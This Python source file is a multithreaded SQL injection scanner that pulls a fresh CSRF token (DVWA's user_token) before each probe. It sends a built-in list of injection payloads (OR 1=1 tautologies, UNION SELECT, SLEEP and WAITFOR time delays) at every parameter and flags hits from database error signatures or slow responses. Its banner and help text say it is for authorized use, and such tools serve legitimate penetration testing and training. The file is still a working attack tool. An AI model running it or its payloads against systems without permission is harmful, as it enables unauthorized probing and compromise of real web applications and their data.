"""
SQL Injection Scanner with CSRF Token Support
==============================================
Enhanced version that handles CSRF tokens (like DVWA's user_token).
For legal/ethical use only — test against DVWA, local apps, or targets
you have explicit permission to test.

CSRF handling strategy:
  - DVWA (and many apps) rotate the CSRF token on every response.
  - We therefore fetch a fresh token before each probe request by doing
    a GET to the target page, extracting the token, then immediately
    submitting the probe.  Each thread owns a private requests.Session
    so cookies (PHPSESSID, security level, etc.) are preserved across
    those two requests without interfering with other threads.
"""

import argparse
import logging
import sys
import threading
import time
import random
import urllib.parse
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from typing import Optional

import requests
from requests.exceptions import RequestException

# SQL Injection Payloads (same as original)
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1 --",
    "' OR 1=1#",
    '" OR "1"="1"',
    "1' OR '1'='1",
    "1 OR 1=1",
    "1 OR 1=1--",
    "1' OR '1'='1'--",
    "';--",
    "' --",
    "' #",
    "') --",
    "')) --",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "'",
    '"',
    "\\",
    "''",
    "' AND SLEEP(2)--",
    "'; WAITFOR DELAY '0:0:2'--",
    "1; WAITFOR DELAY '0:0:2'--",
    "'; SELECT 1--",
]

ERROR_SIGNATURES = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch_array()",
    "mysql_num_rows()",
    "mysql_fetch_assoc()",
    "supplied argument is not a valid mysql",
    "sqlite_error",
    "sqlite3.operationalerror",
    "sqlite_",
    "microsoft ole db provider for odbc drivers error",
    "odbc sql server driver",
    "odbc microsoft access driver",
    "microsoft jet database engine",
    "unclosed quotation mark",
    "incorrect syntax near",
    "sql server",
    "pg_query()",
    "pg_exec()",
    "postgresql error",
    "pgsql error",
    "error: parser:",
    "unterminated quoted string at or near",
    "ora-00907",
    "ora-00933",
    "ora-01756",
    "oracle error",
    "sql syntax",
    "syntax error",
    "sql error",
    "database error",
    "invalid query",
    "quoted string not properly terminated",
]

@dataclass
class ScanResult:
    url: str
    parameter: str
    payload: str
    vulnerable: bool
    reason: str
    status_code: int
    response_time: float
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())


class SQLiScanner:
    def __init__(
        self,
        url: str,
        data: Optional[str] = None,
        cookies: Optional[str] = None,
        headers: Optional[dict] = None,
        method: str = "GET",
        threads: int = 5,
        rate_limit: float = 0.5,
        timeout: int = 10,
        time_threshold: float = 3.0,
        log_file: Optional[str] = None,
        extract_csrf: bool = True,
    ):
        self.url = url
        self.base_data = self._parse_params(data) if data else {}
        self.cookies = self._parse_cookies(cookies) if cookies else {}
        self.headers = headers or {
            "User-Agent": "SQLiScanner/1.0 (Educational/Authorized Use Only)"
        }
        self.method = method.upper()
        self.threads = threads
        self.rate_limit = rate_limit
        self.timeout = timeout
        self.time_threshold = time_threshold
        self.results = []
        self.extract_csrf = extract_csrf
        # Each worker thread gets its own Session stored here.
        # Using a threading.local() means no cross-thread cookie bleed
        # and no locking needed for the session object itself.
        self._thread_local = threading.local()
        self._setup_logging(log_file)

    def _setup_logging(self, log_file: Optional[str]):
        handlers = [logging.StreamHandler(sys.stdout)]
        if log_file:
            handlers.append(logging.FileHandler(log_file))
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s [%(levelname)s] %(message)s",
            handlers=handlers,
        )
        self.logger = logging.getLogger(__name__)

    @staticmethod
    def _parse_params(raw: str) -> dict:
        return dict(urllib.parse.parse_qsl(raw))

    @staticmethod
    def _parse_cookies(raw: str) -> dict:
        cookies = {}
        for part in raw.split(";"):
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                cookies[k.strip()] = v.strip()
        return cookies

    def _extract_csrf_token(self, response_text: str) -> Optional[str]:
        """Extract CSRF token from HTML (e.g., user_token from DVWA)"""
        match = re.search(r"name=['\"]user_token['\"]\s+value=['\"]([^'\"]+)['\"]", response_text)
        if match:
            return match.group(1)
        return None

    def _get_session(self) -> requests.Session:
        """Return (or lazily create) the per-thread session with cookies pre-loaded."""
        if not hasattr(self._thread_local, "session"):
            sess = requests.Session()
            sess.headers.update(self.headers)
            # Seed the session with the caller-supplied cookies
            for k, v in self.cookies.items():
                sess.cookies.set(k, v)
            self._thread_local.session = sess
        return self._thread_local.session

    def _fetch_fresh_csrf_token(self) -> Optional[str]:
        """
        Do a GET to the target page and extract a fresh CSRF token.
        Uses the per-thread session so the PHPSESSID cookie is included,
        and any new Set-Cookie headers (including the rotated token) are
        preserved for the subsequent probe request.
        """
        try:
            sess = self._get_session()
            resp = sess.get(
                self.url,
                params=self.base_data,
                timeout=self.timeout,
                allow_redirects=True,
            )
            return self._extract_csrf_token(resp.text)
        except RequestException as e:
            self.logger.debug(f"CSRF pre-fetch error: {e}")
            return None

    def _get_csrf_token(self) -> Optional[str]:
        """Fetch a fresh CSRF token for the current request (no caching)."""
        return self._fetch_fresh_csrf_token()

    def _send_request(self, params: dict) -> tuple[Optional[requests.Response], float]:
        """Send the probe using the per-thread session (preserves cookies)."""
        sess = self._get_session()
        start = time.monotonic()
        try:
            if self.method == "POST":
                resp = sess.post(
                    self.url,
                    data=params,
                    timeout=self.timeout,
                    allow_redirects=True,
                )
            else:
                resp = sess.get(
                    self.url,
                    params=params,
                    timeout=self.timeout,
                    allow_redirects=True,
                )
            elapsed = time.monotonic() - start
            return resp, elapsed
        except RequestException as e:
            elapsed = time.monotonic() - start
            self.logger.debug(f"Request error: {e}")
            return None, elapsed

    def _check_error_based(self, response: requests.Response) -> tuple[bool, str]:
        body = response.text.lower()
        for sig in ERROR_SIGNATURES:
            if sig in body:
                return True, f"Error signature detected: '{sig}'"
        return False, ""

    def _probe_parameter(self, param: str, payload: str) -> ScanResult:
        time.sleep(self.rate_limit + random.uniform(0, 0.2))

        injected_params = {**self.base_data, param: payload}

        # Fetch a fresh CSRF token before every probe — DVWA rotates tokens
        # on each response so caching a single token across requests fails.
        if self.extract_csrf:
            csrf_token = self._get_csrf_token()
            if csrf_token:
                injected_params['user_token'] = csrf_token
            else:
                self.logger.debug(
                    f"CSRF token not found for param='{param}'; "
                    "proceeding without it (may get rejected by server)"
                )
        
        resp, elapsed = self._send_request(injected_params)

        if resp is None:
            return ScanResult(
                url=self.url,
                parameter=param,
                payload=payload,
                vulnerable=False,
                reason="Request failed / no response",
                status_code=0,
                response_time=elapsed,
            )

        # Error-based detection
        vulnerable, reason = self._check_error_based(resp)

        # Time-based blind detection
        if not vulnerable and elapsed >= self.time_threshold:
            if "SLEEP" in payload.upper() or "WAITFOR" in payload.upper():
                vulnerable = True
                reason = f"Time-based blind SQLi suspected (response took {elapsed:.2f}s)"

        return ScanResult(
            url=self.url,
            parameter=param,
            payload=payload,
            vulnerable=vulnerable,
            reason=reason if vulnerable else "No indicators found",
            status_code=resp.status_code,
            response_time=elapsed,
        )

    def scan(self):
        if not self.base_data:
            self.logger.error(
                "No parameters to test. Provide --data 'param=value' "
                "or include query params in the URL."
            )
            sys.exit(1)

        jobs = [
            (param, payload)
            for param in self.base_data
            for payload in PAYLOADS
        ]

        self.logger.info(f"Target URL    : {self.url}")
        self.logger.info(f"Method        : {self.method}")
        self.logger.info(f"Parameters    : {list(self.base_data.keys())}")
        self.logger.info(f"Payloads      : {len(PAYLOADS)}")
        self.logger.info(f"Total jobs    : {len(jobs)}")
        self.logger.info(f"Threads       : {self.threads}")
        self.logger.info(f"Rate limit    : {self.rate_limit}s per request")
        if self.extract_csrf:
            self.logger.info("CSRF extraction: Enabled")
        self.logger.info("=" * 60)

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {
                executor.submit(self._probe_parameter, param, payload): (param, payload)
                for param, payload in jobs
            }
            for future in as_completed(futures):
                result = future.result()
                self.results.append(result)

                if result.vulnerable:
                    self.logger.warning(
                        f"[VULNERABLE] param='{result.parameter}' | "
                        f"payload='{result.payload}' | "
                        f"reason='{result.reason}' | "
                        f"status={result.status_code} | "
                        f"time={result.response_time:.2f}s"
                    )
                else:
                    self.logger.debug(
                        f"[safe] param='{result.parameter}' | "
                        f"payload='{result.payload[:30]}' | "
                        f"status={result.status_code}"
                    )

        self._print_summary()

    def _print_summary(self):
        vulnerable = [r for r in self.results if r.vulnerable]
        self.logger.info("=" * 60)
        self.logger.info(f"SCAN COMPLETE — {len(self.results)} probes sent")
        self.logger.info(f"Vulnerable findings : {len(vulnerable)} / {len(self.results)}")

        if vulnerable:
            self.logger.info("\n--- Vulnerable Parameters ---")
            seen = set()
            for r in vulnerable:
                key = (r.parameter, r.reason.split(":")[0])
                if key not in seen:
                    seen.add(key)
                    self.logger.info(
                        f"  Parameter : {r.parameter}\n"
                        f"  Reason    : {r.reason}\n"
                        f"  Payload   : {r.payload}\n"
                    )
        else:
            self.logger.info("No SQLi vulnerabilities detected.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="SQL Injection Scanner (CSRF-aware) — for authorized targets only.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("--url", required=True, help="Target URL")
    parser.add_argument(
        "--data", help="Parameters in URL-encoded form: 'id=1&Submit=Submit'"
    )
    parser.add_argument(
        "--method", default="GET", choices=["GET", "POST"], help="HTTP method"
    )
    parser.add_argument("--cookie", help="Cookies: 'PHPSESSID=abc; security=low'")
    parser.add_argument("--threads", type=int, default=5, help="Concurrent threads")
    parser.add_argument(
        "--rate-limit", type=float, default=0.5, help="Seconds between requests"
    )
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (s)")
    parser.add_argument(
        "--time-threshold",
        type=float,
        default=3.0,
        help="Response time (s) to flag time-based blind injection",
    )
    parser.add_argument("--log", help="Path to output log file")
    parser.add_argument(
        "--no-csrf",
        action="store_true",
        help="Disable CSRF token extraction",
    )
    return parser.parse_args()


def print_banner():
    print("""
  ____  ___  _     _       _                _   _
 / ___||  _ \\| |   (_)     (_)_ __  _  ___  ___| |_(_) ___  _ __
 \\___ \\| | | | |   | |     | | '_ \\| |/ _ \\/ __| __| |/ _ \\| '_ \\
  ___) | |_| | |___| |___  | | | | | |  __/ (__| |_| | (_) | | | |
 |____/|____/|_____|_____| |_|_| |_| |\\___|\\___|\\___|_|\\___/|_| |_|
                                   |__/
  ____
 / ___|  ___ __ _ _ __  _ __   ___ _ __
 \\___ \\ / __/ _` | '_ \\| '_ \\ / _ \\ '__|
  ___) | (_| (_| | | | | | | |  __/ |
 |____/ \\___\\__,_|_| |_|_| |_|\\___|_|

  [!] Authorized / legal use only — DVWA, local apps, or with permission.
  [*] CSRF-aware version for protected targets (e.g., DVWA)
""")


if __name__ == "__main__":
    print_banner()
    args = parse_args()

    parsed = urllib.parse.urlparse(args.url)
    if not args.data and parsed.query:
        args.data = parsed.query
        args.url = urllib.parse.urlunparse(parsed._replace(query=""))

    scanner = SQLiScanner(
        url=args.url,
        data=args.data,
        cookies=args.cookie,
        method=args.method,
        threads=args.threads,
        rate_limit=args.rate_limit,
        timeout=args.timeout,
        time_threshold=args.time_threshold,
        log_file=args.log,
        extract_csrf=not args.no_csrf,
    )
    scanner.scan()
